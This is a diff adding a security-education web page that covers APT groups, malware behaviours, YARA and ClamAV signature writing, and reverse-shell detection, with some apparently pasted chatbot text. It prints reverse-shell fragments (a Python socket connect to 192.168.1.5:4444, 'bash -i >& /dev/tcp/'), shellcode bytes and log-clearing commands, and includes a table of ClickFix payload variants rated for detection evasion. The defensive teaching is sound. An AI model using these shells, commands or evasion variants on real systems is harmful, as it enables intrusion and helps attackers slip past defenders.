@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Exploring APTs, Software Tools, and Malware Research">
+    <title>Cybersecurity Research Hub</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 1em 0;
+        }
+        nav {
+            background-color: #444;
+            overflow: hidden;
+        }
+        nav a {
+            color: white;
+            padding: 14px 20px;
+            text-decoration: none;
+            float: left;
+        }
+        nav a:hover {
+            background-color: #575757;
+        }
+        main {
+            padding: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        h1, h2 {
+            color: #333;
+        }
+        section {
+            margin-bottom: 40px;
+        }
+        footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 1em 0;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+        .content-card {
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .content-card h3 {
+            margin-top: 0;
+        }
+        .content-card p {
+            line-height: 1.6;
+        }
+        .card-list {
+            list-style-type: none;
+            padding: 0;
+        }
+        .card-list li {
+            background-color: #f9f9f9;
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Cybersecurity Research Hub</h1>
+    <p>APTs, Software Tools, Malware Research & More</p>
+</header>
+
+<nav>
+    <a href="#apts">APTs</a>
+    <a href="#tools">Software Tools</a>
+    <a href="#research">Malware Research Blogs</a>
+    <a href="#contact">Contact</a>
+</nav>
+
+<main>
+    <section id="apts">
+        <h2>Advanced Persistent Threats (APTs)</h2>
+        <div class="content-card">
+            <h3>What are APTs?</h3>
+            <p>Advanced Persistent Threats (APTs) are long-term, targeted attacks where an attacker gains unauthorized access to a network and remains undetected for an extended period. APTs often involve sophisticated techniques and are usually carried out by well-funded, organized cybercriminal groups or nation-state actors.</p>
+        </div>
+        <div class="content-card">
+            <h3>Notable APT Groups</h3>
+            <ul class="card-list">
+                <li><strong>APT28 (Fancy Bear)</strong> - A Russian cyber espionage group believed to be linked to the Russian government.</li>
+                <li><strong>APT29 (Cozy Bear)</strong> - Another Russian-based group, known for its attacks on political targets.</li>
+                <li><strong>Charming Kitten</strong> - Iranian APT group known for targeting organizations in the Middle East.</li>
+<li>Agrius has deployed base64-encoded variants of ASPXSpy to evade detection downloaded some payloads for follow-on execution from legitimate filesharing services such as ufile.io and easyupload.io</li>
+
+
+
+<li>Ajax Security Team has used FireMalv custom-developed malware, which collected passwords from the Firefox browser storage</li>
+
+
+<li>ALLANITE leverages watering hole attacks to gain access into electric utilities</li>
+<li>ALLANITE has been identified to collect and distribute screenshots of ICS systems such as HMIs.</li>
+
+
+<li>Andariel has exploited numerous ActiveX vulnerabilities, including zero-days</li>
+
+<li>Aoqin Dragon has used the Themida packer to obfuscate malicious payloads</li>
+<li>Aoqin Dragon has used a dropper that employs a worm infection strategy using a removable device to breach a secure network environment</li>
+
+
+
+<li>APT-C-23 has masqueraded malware as legitimate applications.</li>
+<li>APT-C-23 can collect the victim’s phone number, device information, IMSI, etc</li>
+
+
+
+<li>APT-C-36 has embedded a VBScript within a malicious Word document which is executed upon the document opening</li>
+
+
+<li>APT1 uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files</li>
+
+<li>The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by APT1 as a name for malware</li>
+
+
+<li>APT12 has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611</li>
+
+
+<li>APT19 used -W Hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden</li>
+<li>APT19 sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits. Use cobalt strike and empire</li>
+
+<li>APT28 has cleared event logs, including by using the commands wevtutil cl System and wevtutil cl Security</li>
+
+
+<li>APT29 has bypassed UAC</li>
+<li>APT29 has conducted enumeration of Azure AD accounts</li>
+
+
+
+            </ul>
+        </div>
+    </section>
+
+    <section id="tools">
+        <h2>Software Tools for Malware Analysis & Incident Response</h2>
+        <div class="content-card">
+            <h3>Malware Detection Tools</h3>
+            <ul class="card-list">
+                <li><strong>YARA</strong> - A tool used for identifying and classifying malware by creating custom rules.</li>
+                <li><strong>Wireshark</strong> - A network protocol analyzer that helps in detecting suspicious network activity.</li>
+                <li><strong>Volatility</strong> - A memory forensics tool used for analyzing volatile memory dumps.</li>
+<li><strong>Software - Apostle creates new, encrypted versions of files then deletes the originals, with the new filenames consisting of a random GUID and ".lock" for an extension</li>
+<li>Apostle achieves persistence by creating a scheduled task, such as MicrosoftCrashHandlerUAC</li>
+<li>Apostle will attempt to delete all event logs on a victim machine following file wipe activity
+Agrius used a custom tool, sql.net4.exe, to query SQL databases and then identify and extract personally identifiable information.</li>
+
+
+<li><strong>Akira ransomware</strong>, written in C++, is most prominently (but not exclusively) associated with the a ransomware-as-a-service entity Akira.</li>
+Akira deletes administrator accounts in victim networks prior to encryption</li>
+Akira will exfiltrate victim data using applications such as Rclone</li>
+Akira examines files prior to encryption to determine if they meet requirements for encryption and can be encrypted by the ransomware. These checks are performed through native Windows functions such as GetFileAttributesW</li>
+Akira will leverage COM objects accessed through WMI during execution to evade detection</li>
+Akira will execute PowerShell commands to delete system volume shadow copies</li>
+Akira uses software such as Advanced IP Scanner and MASSCAN to identify remote hosts within victim networks</li>
+
+<li><strong>LaZagne</strong> is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. LaZagne is publicly available on GitHub</li>
+LaZagne can use the <PID>/maps and <PID>/mem files to identify regex patterns to dump cleartext passwords from the browser's process memory</li>
+LaZagne can obtain credentials from chats, databases, mail, and WiFi.</li>
+LaZagne can obtain credentials from web browsers such as Google Chrome, Internet Explorer, and Firefox</li>
+	
+LaZagne can obtain credentials from macOS Keychains.</li>
+
+
+ 
+<li><strong>gh0st RAT</strong> uses RC4 and XOR to encrypt C2 traffic</li>
+
+
+<li><strong>Desert Scorpion is surveillanceware that has targeted the Middle East, specifically individuals located in Palestine.</li>
+	
+Desert Scorpion can collect account information stored on the device.</li>
+Desert Scorpion can track the device’s location</li>
+	
+
+Desert Scorpion can record audio from phone calls and the device microphone.</li>
+
+
+<li><strong>FrozenCell</strong> has masqueraded as fake updates to chat applications such as Facebook, WhatsApp, Messenger, LINE, and LoveChat, as well as apps targeting Middle Eastern demographics
+Desert Scorpion can be controlled using SMS messages.</li>
+
+
+
+<li><strong>Micropsia</strong> is a remote access tool written in Delphi.
+Micropsia executes an RAR tool to recursively archive files based on a predefined list of file extensions (.xls, .xlsx, .csv, .odt, .doc, .docx, .ppt, .pptx, .pdf, .mdb, .accdb, .accde, *.txt)</li>
+	
+<li>Micropsia takes screenshots every 90 seconds by calling the Gdi32.BitBlt API</li>
+
+
+<li><strong>Imminent Monitor</strong> has a PasswordRecoveryPacket module for recovering browser passwords
+Imminent Monitor has the capability to run a cryptocurrency miner on the victim machine</li>
+
+<li><strong>The CALENDAR</strong> malware communicates through the use of events in Google Calendar.</li>
+
+<li><strong>gsecdump</strong> can dump Windows password hashes from the SAM</li>
+
+
+<li><strong>HTRAN</strong> is a tool that proxies connections through intermediate hops and aids users in disguising their true geographical location. HTRAN can install a rootkit to hide network connections from the host OS</li>
+
+<li>Responses from the <strong>Pisloader</strong> C2 server are base32-encoded</li>
+
+<li>Pisloader obfuscates files by splitting strings into smaller sub-strings and including "garbage" strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data</li>
+
+
+            </ul>
+        </div>
+        <div class="content-card">
+            <h3>Incident Response Tools</h3>
+            <ul class="card-list">
+                <li><strong>GRR Rapid Response</strong> - Framework for incident response and digital forensics.</li>
+                <li><strong>Volatility Framework</strong> - Memory forensics platform for analyzing the state of a system's memory.</li>
+                <li><strong>Sysinternals Suite</strong> - A set of Windows troubleshooting utilities, which include powerful process analysis tools.</li>
+            </ul>
+        </div>
+    </section>
+
+    <section id="research">
+        <h2>Malware Research Blogs</h2>
+        <div class="content-card">
+            <h3>Notable Malware Research Blogs</h3>
+            <ul class="card-list">
+                <li><strong>FireEye Blog</strong> - Provides analysis and insights into advanced cyber attacks and malware.</li>
+                <li><strong>Malwarebytes Labs</strong> - Offers threat intelligence, research findings, and in-depth analysis of the latest malware.</li>
+                <li><strong>ThreatPost</strong> - A blog that covers cybersecurity, including new malware threats and tactics used by cybercriminals.</li>
+            </ul>
+        </div>
+    </section>
+   <section id="signatures">
+        <h2>Malware Signatures & YARA Rules</h2>
+        <div class="content-card">
+            <h3>What are Malware Signatures?</h3>
+            <p>Malware signatures are unique identifiers or patterns found within malicious files or network traffic that help security software detect and classify them. These signatures are often based on the file's hash, byte sequences, or behavioral patterns. The goal is to create a pattern that can reliably detect specific malware, without false positives.
+Variant	Change	Detected?	Notes
+v1	original	✅	Triggers ClickFix
+v2	replace iex with &('ie'+'x')	🔸 maybe	Obfuscates slightly
+v3	host on HTTPS	❓	Some detectors relax on TLS
+v4	use mshta to run	🔸 maybe	LOLBin variant
+v5	download script and save to file first	🔹 unlikely	Disk-based execution less likely to trigger !MTB
+
+
+</p>
+
+
+
+
+
+        </div>
+
+        <div class="content-card">
+            <h3>What are YARA Rules?</h3>
+            <p>YARA is a powerful tool used to detect and classify malware based on patterns or rules. These rules define a set of conditions that describe specific characteristics of a file or behavior, such as strings, byte patterns, and other features that are common to a particular type of malware. YARA is widely used by malware researchers and incident response teams to identify malicious files and behaviors.</p>
+
+            <h4>Example YARA Rule:</h4>
+            <pre><code>
+rule Example_Malware_Rule {
+    meta:
+        description = "Detects example malware based on a specific string pattern"
+        author = "Security Researcher"
+        last_modified = "2025-04-24"
+
+    strings:
+        $malicious_string = "malicious_pattern_here" ascii
+
+    condition:
+        $malicious_string
+}
+            </code></pre>
+
+            <p>In the above example, the YARA rule defines a signature based on the presence of a specific string ("malicious_pattern_here") within a file. If this string is found, the rule will trigger a detection for the malware.</p>
+
+            <h4>More Example YARA Rule:</h4>
+            <pre><code>
+rule Suspicious_Malware_Behavior {
+    meta:
+        description = "Detects suspicious behavior indicative of malware"
+        author = "Incident Response Team"
+        last_modified = "2025-04-24"
+
+    strings:
+        $suspicious_behavior = { 6A 40 68 2A 00 00 00 68 04 00 00 00 } // Specific byte sequence
+
+    condition:
+        $suspicious_behavior
+}
+
+
+
+rule Example_AgentTesla {
+    meta:
+        description = "An example YARA rule that detects certain versions of AgentTesla"
+        hash = "4ddfa204bd649f9b26a5def51fbb75752bdb7b9bffe4e9c76c2a5c46ff017fc6"
+    strings:
+        $s1 = "/log.tmp" fullword wide
+        $s2 = "<br>User Name: " fullword wide
+        $s3 = "<br>OSFullName: " fullword wide
+        $s4 = "<br>CPU: " fullword wide
+        $s5 = "<br>Computer Name: " fullword wide
+        $s6 = "password=" fullword wide
+        $s7 = "username=" fullword wide
+        $s8 = "daemon.cfg" wide
+        $s9 = "<br>Application: " fullword wide
+        $s10 = "<br>Username: " fullword wide
+        $s11 = "<br>Password: " fullword wide
+    condition:
+        uint16(0) == 0x5a4d and 9 of ($s*) 
+}
+</code></pre>
+  <p>This YARA rule detects a specific byte pattern in a file's binary structure. The byte pattern corresponds to suspicious behavior associated with a known piece of malware.</p>
+        </div>
+    </section>
+<section>
+<h3>STEP BY STEP OF CREATING YOUR OWN SIGNATURES</h3>
+<pre><code>
+ Step-by-Step: Create Your Own Malware Signature DB
+✅ 1. Analyze the Malware (e.g., ClickFix, !MTB)
+Use a sandbox or VM:
+
+Run the sample in Cuckoo Sandbox or any isolated environment
+
+Capture:
+
+File drops
+
+Registry changes
+
+Persistence mechanisms
+
+Network traffic
+
+Strings in binary (with strings or bintext)
+
+Use tools like:
+
+strings malware.exe > out.txt
+
+Procmon for real-time system call tracking
+
+x64dbg or Ghidra for code analysis
+
+✅ 2. Create Signatures
+🔹 Option A: ClamAV Custom Signatures
+Format: .ndb (name, hex signature, offset)
+
+Example:
+
+makefile
+
+Edit
+ClickFix:0:*:4D5A90000300000004000000FFFF
+ClickFix → name
+
+0 → target file type
+
+* → any offset
+
+Hex sequence (from binary or string dump)
+
+Add to:
+
+swift
+
+Edit
+/var/lib/clamav/local.ldb
+Then run:
+
+
+
+freshclam
+clamscan -d /var/lib/clamav --infected --recursive /path/to/scan
+🔹 Option B: YARA Rule
+yara
+
+
+rule ClickFix_Activity
+{
+    strings:
+        $a = "ClickFix" nocase
+        $b = { 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF }
+    condition:
+        any of them
+}
+Then run with:
+
+
+
+
+yara ClickFix.yar /path/to/scan
+✅ 3. Organize Your DB
+Create folders for:
+
+Signatures by malware family
+
+YARA rules
+
+Hashes & IOCs (md5, sha256, urls, ips)
+
+Behavioral reports (JSON/HTML from sandboxes)
+
+Optional: Set up a Git repo for version control and team collaboration.
+
+✅ 4. Automate Scanning
+Hook your DB into:
+
+Linux cron job running ClamAV/YARA every night
+
+SIEM or EDR systems
+
+File uploads (e.g., scan USBs or network shares)
+
+💡 Pro Tip: Collect from the Wild
+Grab samples from:
+
+malwarebazaar, MalShare, VirusTotal, ANY.RUN
+
+Use VT API to hunt related hashes
+
+Collect IOC feeds from abuse.ch and MISP
+
+📌 Summary
+
+
+
+
+ Known Byte Streams / Magic Bytes for Malware Signatures
+💣 1. Windows PE Files (Common Malware Wrapper)
+Most malware on Windows is a PE (Portable Executable), so start with this:
+
+swift
+
+Edit
+4D 5A            ; "MZ" header — start of any Windows PE EXE/DLL
+50 45 00 00      ; "PE\0\0" — PE signature
+Common pattern: 4D 5A ... [few bytes] ... 50 45 00 00
+
+🦠 2. Meterpreter / Shellcode Payloads
+These are common in post-exploitation tools like Metasploit.
+
+Reverse TCP shell payload (x86):
+nginx
+
+Edit
+FC E8 82 00 00 00 60 89 E5 31 C0 64 8B 50 30
+This is a standard Meterpreter shellcode stub.
+
+🐚 3. PowerShell-based Malware (Encoded in Base64)
+Common pattern when attackers use PowerShell to execute payloads:
+
+Base64-encoded payloads often start with:
+
+
+
+TVqQAAIAAA...
+Which is the base64 version of MZ (i.e., a PE file loaded in memory).
+
+🧬 4. UPX Packed Executables
+UPX is a common packer used by both legit and malicious tools.
+
+Look for:
+
+arduino
+
+Edit
+55 50 58 21       ; "UPX!"
+Often found at the start of the section headers or overlay data.
+
+🪓 5. DarkComet RAT Signature
+Known DarkComet RAT configurations or stubs may include:
+
+
+44 43 2D 53 74 75 62 ; "DC-Stub"
+👁️ 6. Remcos RAT
+Look for "Remcos" strings in binaries:
+
+
+52 65 6D 63 6F 73    ; ASCII "Remcos"
+Also often uses RCStub or similar indicators.
+
+💥 7. Nanocore RAT
+
+4E 61 6E 6F 63 6F 72 65 ; "Nanocore"
+🔥 8. Crypto Miners / XMRig
+XMRig is often embedded in miner malware:
+
+
+58 4D 52 69 67       ; "XMRig"
+Also may connect to pools with stratum+tcp:// in strings.
+
+🛠️ 9. AutoIt Packed Malware
+AutoIt scripts compiled into EXEs often have this signature:
+
+
+41 75 74 6F 49 74 33   ; "AutoIt3"
+🧙‍♂️ 10. Custom Indicators (From Your Own Samples)
+If you’ve extracted your own malware samples (e.g. ClickFix, !MTB, etc), you can:
+
+Run strings malware.exe | grep -i clickfix
+
+Look for unique identifiers, config blobs, hardcoded domains, mutexes, etc.
+
+Extract unique byte sequences and match them:
+
+
+43 6C 69 63 6B 46 69 78 ; ASCII "ClickFix"
+🧰 Tools to Extract Byte Streams
+Tool	Command Example
+xxd	xxd malware.exe > malware.hex
+strings	strings -a -tx malware.exe
+YARA	yara -r custom_rules.yar samples/
+Radare2	Reverse-engineer byte regions
+ClamAV	Use .ndb to register hex rules
+💡 Tip: Avoid False Positives
+Make sure your byte patterns are:
+
+Unique (don’t match legit software)
+
+Not too short (6+ bytes is a good start)
+
+Combined with conditions (offset, filename, etc.)
+
+🧪 Want a Sample Custom Signature?
+Here’s a simple ClamAV .ndb rule matching the start of a UPX-packed file:
+
+UPX_Packed:0:*:55505821
+Or a YARA version:
+
+
+rule UPX_Packed
+{
+    strings:
+        $upx = { 55 50 58 21 }
+    condition:
+        $upx
+}
+Let me know if you want to create a database or automated scanner using these — we can build a tool or a full threat feed manager together.
+
+
+
+
+ 1. Metasploit x86 Reverse TCP Shellcode
+One of the most widely used revshells (default Metasploit):
+
+
+FC E8 82 00 00 00 60 89 E5 31 C0 64 8B 50 30
+🔹 That’s the start of a common Windows reverse shell payload.
+If you find this in a binary — red flag.
+
+🐍 2. Python Reverse Shell Pattern
+Often obfuscated, but when base64-decoded or deobfuscated, it looks like this:
+
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.1.5",4444))
+✂️ Signature:
+Regex or string for:
+
+pgsql
+
+
+socket.socket
+subprocess.Popen
+s.connect(
+🦠 3. Encoded Shells in Base64 (Bash, Powershell)
+Bash reverse shell (base64 encoded):
+
+YmFzaCAtY...   ← base64 of: bash -i >& /dev/tcp/...
+PowerShell encoded:
+Starts with:
+
+
+powershell -enc <base64>
+Decrypted payloads often include:
+
+New-Object Net.Sockets.TCPClient
+
+GetStream(), Read(), Write()
+
+🔍 YARA-style example:
+
+rule PS_ReverseShell
+{
+    strings:
+        $tcp = "New-Object Net.Sockets.TCPClient"
+        $stream = "GetStream"
+    condition:
+        all of them
+}
+🐚 4. Generic Reverse Shell Signatures (in Assembly/Hex)
+These might be found in staged shellcode:
+
+
+31 C0 50 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 50
+53 89 E1 99 B0 0B CD 80
+🔹 Linux reverse shell – invokes /bin/sh
+
+🔗 5. Cobalt Strike Beacon (Revshell-like Behavior)
+Often encrypted, but early stagers may leak markers like:
+
+
+GET /aaaA HTTP/1.1
+POST /submit HTTP/1.1
+Stagers use hardcoded C2 domains, and connect silently.
+
+🕵️ 6. Detecting Reverse Shell Behaviorally
+Besides static byte patterns, look for runtime behavior:
+
+Using Sysmon or EDR:
+Indicator	Explanation
+cmd.exe spawning from svchost.exe	Suspicious
+Connection to uncommon port (e.g. 4444, 1337)	Typical revshell behavior
+powershell.exe with base64 or obfuscation	Common
+Process injection or hollowing	Used by Metasploit/Cobalt
+netstat -an	Show active shells
+💾 Sample Custom ClamAV Signature for Reverse Shell
+text
+
+Edit
+RevShell_MSF:0:*:FC E8 82 00 00 00 60 89 E5 31 C0 64 8B 50 30
+Or base64-matching reverse shell in .ldb:
+
+
+PS_Base64Rev:1:*:706F7765727368656C6C202D656E63
+(powershell -enc)
+
+🛡️ Combine Static + Behavioral + Network
+🧠 YARA / ClamAV for static detection
+
+🔎 Sysmon / Auditd for process + socket tracking
+
+🌐 Snort / Suricata to match TCP reverse shell connections
+
+✅ TL;DR – What to Add to Your Custom DB
+Signature Type	Example
+Metasploit Shellcode	FC E8 82 00 ...
+PowerShell TCPClient	New-Object Net.Sockets.TCPClient
+Bash Reverse Shell	bash -i >& /dev/tcp/
+Base64 Payloads	powershell -enc, YmFzaCAtY...
+YARA Rules	Match keywords + structure
+ClamAV .ndb	Hex patterns at any offset
+</code></pre>
+
+  <section id="classification">
+        <h2>Malware Classification: Type, Platform, Family, Variant, and Suffixes</h2>
+        <div class="content-card">
+            <h3>Understanding Malware Classification</h3>
+            <p>Malware is often classified using a systematic naming convention that includes several key components:</p>
+            <ul class="card-list">
+                <li><strong>Type:</strong> Defines the general category of the malware (e.g., virus, worm, trojan, backdoor).</li>
+                <li><strong>Platform:</strong> Indicates the operating system or environment where the malware is designed to operate (e.g., Win32, Linux, MacOS, Android).</li>
+                <li><strong>Family:</strong> Refers to a group of malware strains that share similar characteristics or code base. For example, multiple variants of a worm can belong to the same family.</li>
+                <li><strong>Variant:</strong> Denotes a specific version or modification of the malware, often indicating a new attack vector or technique.</li>
+                <li><strong>Suffixes:</strong> These are additional markers that help in the further classification of malware. For example, ".D" or ".T" can be used to indicate specific behaviors or tactics used by the malware.</li>
+            </ul>
+
+            <h4>Example Classification: Backdoor:Win32/Caphaw.D!lnk</h4>
+            <p>This is an example of a malware classification string:</p>
+            <pre><code>
+Backdoor:Win32/Caphaw.D!lnk
+            </code></pre>
+            <ul>
+                <li><strong>Type:</strong> Backdoor — This indicates that the malware provides unauthorized access to a victim's system, allowing an attacker to control it remotely.</li>
+                <li><strong>Platform:</strong> Win32 — The malware is designed for the 32-bit version of the Windows operating system.</li>
+                <li><strong>Family:</strong> Caphaw — This refers to the malware family, which typically shares similar behaviors and characteristics.</li>
+                <li><strong>Variant:</strong> D — This indicates a specific variant or version of the Caphaw family.</li>
+                <li><strong>Suffix:</strong> !lnk — The suffix provides additional context, often related to the file format or method of delivery. In this case, it refers to a malicious shortcut (.lnk) used in the attack.</li>
+            </ul>
+        </div>
+    </section>
+</main>
+
+<footer>
+    <p>&copy; 2025 Cybersecurity Research Hub. All rights reserved.</p>
+</footer>
+
+</body>
+</html>
